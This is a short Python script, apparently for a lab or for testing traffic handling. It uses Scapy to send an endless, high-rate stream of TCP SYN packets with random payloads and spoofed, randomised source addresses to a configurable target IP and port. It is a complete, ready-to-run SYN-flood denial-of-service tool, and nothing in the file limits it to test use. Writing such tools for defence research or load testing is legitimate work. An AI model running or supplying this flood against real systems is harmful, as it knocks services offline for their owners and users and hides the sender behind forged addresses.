import argparse
from scapy.all import *
from scapy.layers.inet import *

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--target-ip', dest='target_ip', default='10.0.1.1')
    parser.add_argument('--target-port', dest='target_port', default='80')
    parser.add_argument('--sip-mask', dest='sip_mask', default='16')
    parser.add_argument('--interface', '-if', dest='interface', default='lo')
    parser.add_argument('--interval', dest='interval', default='0.0001')
    parser.add_argument('--verbose', '-v', dest='verbose',
                        action='store_true', default=False)
    args = parser.parse_args()

    ip = IP(src=RandIP(f"192.168.1.1/{int(args.sip_mask)}"), dst=args.target_ip)
    tcp = TCP(sport=RandShort(), dport=int(args.target_port), flags="S")

    p = Ether() / ip / tcp / Raw(RandString(size=1400))
    sendp(p, iface=args.interface, loop=1, verbose=args.verbose, inter=float(args.interval))